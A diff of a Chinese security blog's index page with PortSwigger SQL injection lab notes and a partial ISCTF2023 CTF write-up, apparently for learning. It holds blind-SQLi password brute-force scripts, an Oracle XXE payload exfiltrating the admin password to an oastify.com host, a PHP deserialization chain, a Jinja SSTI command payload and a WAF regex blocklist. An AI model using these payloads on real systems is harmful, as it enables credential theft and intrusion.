@@ -172,6 +172,1181 @@
         
 
 <div class="post">
+    <a href="/2023/12/22/Portswigger%20sql%E6%B3%A8%E5%85%A5/">
+        <h2 class="post-title">Portswigger sql注入</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h3 id="lab1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#lab1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3><p>给出了sql语句</p>
+<p><code>SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1</code></p>
+<p>要求  <code>display one or more unreleased products</code></p>
+<p>在filter处存在注入</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/79a7ba36413b22d5220b2599a0289b63.png" alt="image-20231219122928057"></p>
+<p>这里靶场指出 不要随意的测试 or 1&#x3D;1 在update 和 delete下可能会增删数据</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fdee2d8f13fa41db26dd234a41b25005.png" alt="image-20231219124424068"></p>
+<h3 id="lab2-SQL-injection-vulnerability-allowing-login-bypass"><a href="#lab2-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="lab2: SQL injection vulnerability allowing login bypass"></a>lab2: SQL injection vulnerability allowing login bypass</h3><p>需求: administrator登录</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01b149172539795e00405515d2aec23a.png" alt="image-20231219125156339"></p>
+<h3 id="lab3-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#lab3-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="lab3 SQL injection attack, querying the database type and version on Oracle"></a>lab3 SQL injection attack, querying the database type and version on Oracle</h3><p>需求:获取Oracle数据的数据库版本</p>
+<pre><code class="sql">mysql mssql SELECT @@version
+Oracle SELECT banner from v$version
+Postgresql SELECT version()
+</code></pre>
+<p>还要注意的是Oracle数据库的特性</p>
+<p>在oracle中查询必须要指定表 </p>
+<p>dual是一个虚拟表 总是存在 </p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8c09a0dbc993d109c8d4eeaefc83f678.png" alt="image-20231219173226831"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9fc9df669958c4eeb05ea350d1162739.png" alt="image-20231219173800727"></p>
+<h3 id="lab4-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#lab4-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/518f7bf8a7eb1a51cb81d0b55b07ebdd.png" alt="image-20231219180152297"></p>
+<h3 id="lab5-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#lab5-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="lab5: SQL injection attack, listing the database contents on non-Oracle databases"></a>lab5: SQL injection attack, listing the database contents on non-Oracle databases</h3><p>需求:administrator登录</p>
+<p>除外Oracle都有类似<code>information_schema</code>的数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a9d96dbdae0eff5b2c3f24f8bcdf6c9d.png" alt="image-20231219182829822"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6ddfd4f340b81c0dfbdb19a08cfe57c9.png" alt="image-20231219182906274"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/834f6bb22a029aa7412bd3a60d913af6.png" alt="image-20231219182940513"></p>
+<h3 id="lab6-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#lab6-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="lab6: SQL injection attack, listing the database contents on Oracle"></a>lab6: SQL injection attack, listing the database contents on Oracle</h3><pre><code class="sql">SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ceca8c266eae52b1938337976246b2f9.png" alt="image-20231219183434276"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c15f2b54e806a0d279fd239ee5befade.png" alt="image-20231219183514304"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6958b419fb95c9110ec6805f93e26fcc.png" alt="image-20231219183548278"></p>
+<h3 id="lab7-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#lab7-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="lab7: SQL injection UNION attack, determining the number of columns returned by the query"></a>lab7: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack, determining the number of columns returned by the query</h3><p>需求:返回包含null的值</p>
+<p>order by到4报错 </p>
+<p><code>union select null,null,null</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8dc592ab2e1006d50b1a09dae061c249.png" alt="image-20231219130415069"></p>
+<h3 id="lab8-SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#lab8-SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="lab8: SQL injection UNION attack, finding a column containing text"></a>lab8: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack, finding a column containing text</h3><p>需求:返回指定字符串</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/67fc764eb6be7e0969a274c59b55754c.png" alt="image-20231219134334478"></p>
+<h3 id="lab9-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#lab9-SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="lab9:SQL injection UNION attack, retrieving data from other tables"></a>lab9:<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack, retrieving data from other tables</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f8f74632b103a45cfaf4250a49a29607.png" alt="image-20231219142215155"></p>
+<h3 id="lab10-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#lab10-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="lab10: SQL injection UNION attack, retrieving multiple values in a single column"></a>lab10: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack, retrieving multiple values in a single column</h3><p>字符串拼接以读取多个数据</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5bdeebc84d8755c9cf3105bcef6f4946.png" alt="image-20231219205821155"></p>
+<p>在union的第二个参数可以注出来 可以分两次读username 和 password </p>
+<p>拼接感觉可有可无</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1da1dca82b293f2d0ab4eb2c9c37384a.png" alt="image-20231219210712204"></p>
+<h3 id="lab11-Blind-SQL-injection-with-conditional-responses"><a href="#lab11-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="lab11: Blind SQL injection with conditional responses"></a>lab11: Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with conditional responses</h3><p>admin登录 密码只有小写字符和数字</p>
+<p>注入点在cookie</p>
+<p>正确闭合会返回welcome back</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/29a61c0149ea2d955702e7f0fa4a376c.png" alt="image-20231220200641639"></p>
+<p>不知道为什么脚本跑不出来 用burp爆</p>
+<pre><code class="py">import requests
+import string
+
+dictionary = string.digits+string.ascii_lowercase
+url = &quot;https://0aa400ba03b4cc9680ef68ab00e400e2.web-security-academy.net/&quot;
+xxx = &quot;&quot;
+for i in range(1, 666):
+    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
+    for j in dictionary:
+        flag = True
+        headersList = &#123;
+            &quot;Cookie&quot;: &quot;zO0fub8XNfffQeEc&#39;and substr((select password from users where username = &#39;administrator&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39;--+&quot;.format(i, j)
+        &#125;
+
+        sess = requests.session()
+        res = sess.get(url,headers=headersList)
+        print(res.text)
+        if (&#39;Welcome back!&#39; in res.text):
+            xxx += j
+            print(xxx)
+            flag = False
+            break
+    if (flag):
+        print(xxx)
+        break
+
+</code></pre>
+<p><code>TrackingId=zO0fub8XNfffQeEc&#39;and substr((select password from users where username = &#39;administrator&#39;),1,1) = &#39;a&#39;--+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/09fe44a4a296cf770ae7c1ff2dd0df67.png" alt="image-20231221002422770"></p>
+<h3 id="lab12-Blind-SQL-injection-with-conditional-errors"><a href="#lab12-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="lab12: Blind SQL injection with conditional errors"></a>lab12: Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with conditional errors</h3><p>administrator登录 使用的Oracle数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7e9803abd6377d99b561e582c4435d97.png" alt="image-20231221100243993"></p>
+<p>注入点在cookie</p>
+<p>当sql执行错误时返回 Internal Server Error</p>
+<p><code>&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;a&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users where username = &#39;administrator&#39;)||&#39;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/95e78b1554a91771080d24fd7fd01476.png" alt="image-20231221104122315"></p>
+<h3 id="Lab13-Visible-error-based-SQL-injection"><a href="#Lab13-Visible-error-based-SQL-injection" class="headerlink" title="Lab13: Visible error-based SQL injection"></a>Lab13: Visible error-based SQL injection</h3><p><code>&#39; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a7b7b9b6de441ed556e9907caa69f0bc.png" alt="image-20231221111036947"></p>
+<p>不知道是oracle还是SqlServer还是postgresql的语法</p>
+<p>原理是将字符串转int会报错</p>
+<h3 id="lab14-Blind-SQL-injection-with-time-delays"><a href="#lab14-Blind-SQL-injection-with-time-delays" class="headerlink" title="lab14: Blind SQL injection with time delays"></a>lab14: Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with time delays</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/224669b54d4caaa934d7f66d883f367c.png" alt="image-20231221111811176"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cf863dc016d3e323d84bb870f8866308.png" alt="image-20231221112122864"></p>
+<p>一个个测</p>
+<h3 id="lab15-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#lab15-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="lab15: Blind SQL injection with time delays and information retrieval"></a>lab15: Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with time delays and information retrieval</h3><p>postgresql</p>
+<p><code>&#39;;SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--</code></p>
+<p><code>&#39;;SELECT CASE WHEN (username = &#39;administrator&#39; and substr(password,1,1) = &#39;a&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2b42c3e3649e04f7b121aec8b55c86a8.png" alt="image-20231221114631278"></p>
+<p>显示响应时间</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fac1df1f0b523b1ec7db1afba3bea7ff.png" alt="image-20231221114821663"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/28ead0ede2fa632926613900ae6d4598.png" alt="image-20231221114946864"></p>
+<h3 id="lab16-Blind-SQL-injection-with-out-of-band-interaction"><a href="#lab16-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="lab16:  Blind SQL injection with out-of-band interaction"></a>lab16:  Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with out-of-band interaction</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e1cd442361cc56badebcf51977093c94.png" alt="image-20231221120033755"></p>
+<p>外带数据</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/58e68a409de943f2fea95b96188841a7.png" alt="image-20231221115150842"></p>
+<p>必须用burp自带的dnslog</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d6364b799a84e8be39444361fa848f80.png" alt="image-20231221120020327"></p>
+<h3 id="lab17-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#lab17-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="lab17: Blind SQL injection with out-of-band data exfiltration"></a>lab17: Blind <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL injection</a> with out-of-band data exfiltration</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/1914a528f3f7d11d91d9c6fc21fb5266.png" alt="image-20231221120148937"></p>
+<p><code>&#39;union+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#39;||(SELECT+password+from+users+where+username+%3d+&#39;administrator&#39;)||&#39;.00y7v3thhd1z8sqq172oh60kfbl49t.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2f0c58e90335a490f2565f4b35e05af6.png" alt="image-20231221120402790"></p>
+<h3 id="lab18-SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#lab18-SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="lab18: SQL injection with filter bypass via XML encoding"></a>lab18: SQL injection with filter bypass via XML encoding</h3><p>绕waf 官方推荐了插件 <code>Hackvertor</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/796cadf88b7af125fd81d0aa8b88ff7a.png" alt="image-20231221120607464"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3c76f8c5497079292feaa22c2e1f44be.png" alt="image-20231221121140552"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3b881446bead680417b55f70cb379360.png" alt="image-20231221121200478"></p>
+<p>加单引号直接被waf拦了</p>
+<p>用插件进行混淆</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e724f8097a122bd6ffd818d5e7b74a27.png" alt="image-20231221121517819"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00bcd4">数据库</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/sql/" style="color: #03a9f4">sql</a>
+        </span>
+        
+    </div>
+    <a href="/2023/12/22/Portswigger%20sql%E6%B3%A8%E5%85%A5/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/11/29/ISCTF2023%20%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">ISCTF2023 部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/29
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>学一年了还在入门(</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/fea5516a75f0ffffa669892a79bc8dab.png" alt="image-20231122155102289"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2e6ad1f37c50e0380de0553d89c1d13f.png" alt="image-20231122155023764"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8ecb40b374e779b2809c218f22e5c420.png" alt="image-20231122154919181"></p>
+<p><code>ISCTF&#123;41631519-1c64-40f6-8dbb-27877a184e74&#125;</code></p>
+<h2 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争"></a>圣杯战争</h2><pre><code class="php">&lt;?php
+// highlight_file(__FILE__);
+// error_reporting(0);
+
+class artifact&#123;
+    public $excalibuer;
+    public $arrow;
+    public function __toString()&#123;
+        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;
+        return $this-&gt;excalibuer-&gt;arrow;
+    &#125;
+&#125;
+
+class prepare&#123;
+    public $release;
+    public function __get($key)&#123;
+        $functioin = $this-&gt;release;
+        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;
+        return $functioin();
+    &#125;
+&#125;
+class saber&#123;
+    public $weapon;
+    public function __invoke()&#123;
+        echo &quot;胜利！&lt;br&gt;&quot;;
+        include($this-&gt;weapon);
+    &#125;
+&#125;
+class summon&#123;
+    public $Saber;
+    public $Rider;
+
+    public function __wakeup()&#123;
+        echo &quot;开始召唤从者！&lt;br&gt;&quot;;
+        echo $this-&gt;Saber;
+    &#125;
+&#125;
+
+$S = new summon();
+$A = new artifact();
+$P = new prepare();
+$SABER = new saber(); 
+$S -&gt; Saber = $A;
+$A -&gt; excalibuer = $P;
+$P -&gt; release = $SABER;
+$SABER -&gt; weapon = &quot;php://filter/convert.base64-encode/resource=flag.php&quot;;
+echo serialize($S);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0076222d37bae441e538713ca3eb081c.png" alt="image-20231122155644753"></p>
+<h2 id="绕进你心里"><a href="#绕进你心里" class="headerlink" title="绕进你心里"></a>绕进你心里</h2><p>考点 <code>md5强碰撞 变异传参 数组绕intval 回溯绕正则</code></p>
+<pre><code class="py">import requests
+
+data = &#123;
+    &#39;pan[gu&#39;: &#39;a&#39;*1000000 + &#39;2023ISCTF&#39;
+&#125;
+
+res = requests.post(&#39;http://43.249.195.138:20804?hongmeng=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;shennong=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;zhurong[]=1&#39;,
+                    data=data, allow_redirects=False)
+print(res.text)
+</code></pre>
+<h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>尝试admin admin登录 提示用户admin登录成功</p>
+<p>那么应该是盲注</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1ef44000063e2077fd38b41e58cbf91f.png" alt="image-20231122221942865"></p>
+<p>注入点在username</p>
+<p>部分关键字会被替换为空 用双写绕过</p>
+<pre><code class="py">import requests
+import string
+
+dictionary = string.digits+string.ascii_letters+&quot;-&#123;,&#125;&quot;
+url = &quot;http://43.249.195.138:22469/check.php&quot;
+xxx = &quot;&quot;
+for i in range(1, 666):
+    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
+    for j in dictionary:
+        flag = True
+
+        # payload = &quot;admin&#39;anandd/**/substr(database(),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;%23&quot;.format(i,j)
+        # payload = &quot;admin&#39;anandd/**/substr(version(),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;%23&quot;.format(i, j)
+        # payload = &quot;admin&#39;anandd/**/substr((seleselectct/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/=/**/&#39;users&#39;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;#&quot;.format(i, j)
+        # payload = &quot;admin&#39;anandd/**/substr((seleselectct/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema/**/=/**/&#39;users&#39;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;#&quot;.format(i, j)
+        # payload = &quot;admin&#39;anandd/**/substr((seleselectct/**/group_concat(user)/**/from/**/users.users),&#123;&#125;,1)=&#39;&#123;&#125;&#39;#&quot;.format(i, j)
+        payload = &quot;admin&#39;anandd/**/substr((seleselectct/**/group_concat(passwoorrd)/**/from/**/users),&#123;&#125;,1)=&#39;&#123;&#125;&#39;#&quot;.format(i, j)
+
+        data = &#123;&#39;username&#39;: payload,&quot;password&quot;:&quot;admin&quot;&#125;
+        res = requests.post(url=url, data=data)
+
+        # print(res.text)
+        # exit(0)
+        if (&#39;用户$admin$登录成功&#39; in res.text):
+            xxx += j
+            print(xxx)
+            flag = False
+            break
+    if (flag):
+        print(&quot;final:\n&#123;&#125;&quot;.format(xxx))
+        break
+
+
+# users 库
+# users 表
+# uesr password
+# admin,guest,flag
+# 手动改大写
+</code></pre>
+<h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/d7251f83d1232c00293bc5cb664acfc5.png" alt="image-20231122230034821"></p>
+<h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/d1161ff25f2b7572236e39f9a46a15bd.png" alt="image-20231123190224188"></p>
+<h2 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a>1z_Ssql</h2><p>在robots.txt中存在here_is_a_sercet.php</p>
+<p>其中存在waf的源码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/007c69a10583c7a2381046da57fb845c.png" alt="image-20231124072054415"></p>
+<p>通过js目录下的rc4解密</p>
+<pre><code class="py">const SM4 = require(&quot;gm-crypt&quot;).sm4;
+
+var payload = &quot;762V08zk+xrmKxIFrdJIJj6ULvI8Lc0pX39LjDyIUb0eAGkZe4KQa87TJXuqnFw0u/669wWRsqYFya812FtULw9+tpiGlaH2gleDfDKzr+g=&quot;;
+
+let sm4Config = &#123;
+    key: &quot;B6*40.2_C9#e4$E3&quot;,
+    mode: &quot;ecb&quot;,
+    cipherType: &quot;base64&quot;
+&#125;;
+let sm4 = new  SM4(sm4Config);
+
+var result = sm4.decrypt(payload);
+
+console.log(&quot;解密:&quot; + result)
+</code></pre>
+<pre><code>/union|=|+|sleep|benchmark|for|where|sys|innodb|is|null|like|/*|*//i
+</code></pre>
+<p>万能密码拿到hint</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c5dc9b9687f66960358cec7f8293db3a.png" alt="image-20231123233537371"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0762530324c29a17e58f6734de59216d.png" alt="image-20231123233623536"></p>
+<p>没用</p>
+<p>那就盲注</p>
+<p>得到表为 <em>bthcls</em></p>
+<p>然后已知for sys innodb 都被ban了 一直在考虑怎么绕过</p>
+<p>觉得题目给的secret.php后端waf可能是php写的 也尝试了回溯绕正则</p>
+<p>失败 </p>
+<p>这时候想起来题目给了两个文本 应该分别对应的表和列</p>
+<pre><code class="py">import requests
+import string
+
+dictionary = string.digits+string.ascii_letters+&quot;-&#123;,&#125;&quot;
+url = &quot;http://43.249.195.138:22431&quot;
+proxy = &#123;&quot;http&quot;:&quot;127.0.0.1:8800&quot;&#125;
+
+
+# def prove():
+#     f1 = open(&quot;D:\Desktop\\blind_injection\some name1.txt&quot;, &quot;r&quot;)
+#     tables = f1.readlines()
+#     f2 = open(&quot;D:\Desktop\\blind_injection\some name2.txt&quot;, &quot;r&quot;)
+#     columns = f2.readlines()
+#     f1.close()
+#     f2.close()
+#     for table in tables:
+#         for column in columns:
+#             payload = &quot;a&#39;or ascii(substr((select group_concat(&#123;&#125;) from &#123;&#125;),1,1)) &gt; 0#&quot;.format(
+#                 column.strip(), table.strip()).replace(&quot; &quot;, &quot;	&quot;)
+#             data = &#123;&#39;username&#39;: payload, &quot;password&quot;: &quot;a&quot;&#125;
+#             res = requests.post(url=url, data=data)
+
+#             if (&#39;You are so smart! Let me give you a hint ↓ 5aSn5L2s77yM5L2g6L+Z5LmI6IGq5piO5bqU6K+l5LiN6ZyA6KaBaGludOWQpz8=&#39; in res.text):
+#                 print(&quot;&#123;&#125;&#123;&#125;&quot;.format(column,table))
+#                 exit(&quot;found!&quot;)
+# password users
+
+xxx = &quot;&quot;
+for i in range(1, 666):
+    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
+    for j in dictionary:
+        flag = True
+
+        # payload = &quot;a&#39; or substr(database(),&#123;&#125;,1) regexp &#39;&#123;&#125;&#39;#&quot;.format(
+        #     i, j).replace(&quot; &quot;, &quot;	&quot;)
+
+        # payload = &quot;a&#39;or substr(version(),&#123;&#125;,1) regexp &#39;&#123;&#125;&#39;#&quot;.format(
+        #     i, j).replace(&quot; &quot;, &quot;	&quot;)
+
+        payload = &quot;a&#39;or substr((select group_concat(password) from users),&#123;&#125;,1) regexp &#39;&#123;&#125;&#39;#&quot;.format(
+            i, j).replace(&quot; &quot;, &quot;	&quot;)
+        data = &#123;&#39;username&#39;: payload, &quot;password&quot;: &quot;a&quot;&#125;
+        res = requests.post(url=url, data=data)
+
+        if (&#39;You are so smart! Let me give you a hint ↓ 5aSn5L2s77yM5L2g6L+Z5LmI6IGq5piO5bqU6K+l5LiN6ZyA6KaBaGludOWQpz8=&#39; in res.text):
+            xxx += j
+            print(xxx)
+            flag = False
+            break
+    if (flag):
+        print(&quot;final:\n&#123;&#125;&quot;.format(xxx))
+        break
+
+# prove()
+
+# bthcls 库
+# users 表
+# password 列
+</code></pre>
+<p>然后登录</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ef071a609aafc9e4bbb1768dd8493533.png" alt="image-20231124131909340"></p>
+<h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><p>存在index.bak</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3004ad3a0c238bbc541f0cc55343a20c.png" alt="image-20231126235602977"></p>
+<p>手测两位 猜测是mihoyo</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/acafaec5f8dc00d401e52592f77617e7.png" alt="image-20231126235834985"></p>
+<h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a>fuzz!</h2><p>fuzz后发现保留了</p>
+<p><code>[0-9a-zA-Z]</code> 和 <code>- . / : &#123; | &#125; [ ]</code> </p>
+<p>| 保留了 所以可以命令注入</p>
+<p>写个马<img src="https://img-blog.csdnimg.cn/img_convert/456833d600527f1b582130ab743400ef.png" alt="image-20231127234523565"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c77a6e9195da62b90d2dbd3d410e418a.png" alt="image-20231127234514199"></p>
+<p>这里的马要求b64后结尾无特殊符号 手动调一下马的格式就行</p>
+<p>然后读文件</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fa3c49b8f3a4b80d27c74b19bb790298.png" alt="image-20231127234602593"></p>
+<h2 id="恐怖G7人"><a href="#恐怖G7人" class="headerlink" title="恐怖G7人"></a>恐怖G7人</h2><p>  <code>&#123;&#123;url_for.__globals__.__builtins__['__import__']('os').popen('env').read()&#125;&#125;</code></p>
+<p>没waf貌似</p>
+<p>但是读了waf.py发现还是有黑名单的 不知道是不是没挂上</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="你说爱我？尊嘟假嘟"><a href="#你说爱我？尊嘟假嘟" class="headerlink" title="你说爱我？尊嘟假嘟"></a>你说爱我？尊嘟假嘟</h2><p>注意到只有三个字符串</p>
+<p>你说爱我</p>
+<p>尊嘟</p>
+<p>假嘟</p>
+<p>给他替换成Ook.  Ook! Ook?</p>
+<p>解得</p>
+<p><code>ild3l4pXejwPcCwJsPAOq7sJczdRdTsJcCEUsP1Z</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/033f7d8a9dad703f2d422bc14231b28d.png" alt="image-20231122153654723"></p>
+<p>换表的b64 解码得<code>ISCTF&#123;9832h-s92hw-23u7w-2j8s0&#125;</code></p>
+<h2 id="七七的欧拉"><a href="#七七的欧拉" class="headerlink" title="七七的欧拉"></a>七七的欧拉</h2><p>n 8185位</p>
+<p>e 512位</p>
+<p>p 1024位</p>
+<p>尝试对n开根 发现是可以开完的<img src="https://img-blog.csdnimg.cn/img_convert/eeac895132fef6a7a41343f61d4bd285.png" alt="image-20231122160423224"></p>
+<p>一直开8次都能开完</p>
+<p>说明<code>n = p^8</code></p>
+<pre><code class="py">from Crypto.Util.number import *
+import gmpy2
+
+
+
+e=8401285423075497989963572888601376313375827722858883767564499066473101615084214973041844878664837606157257039358849583049856161628241418012475432529735909
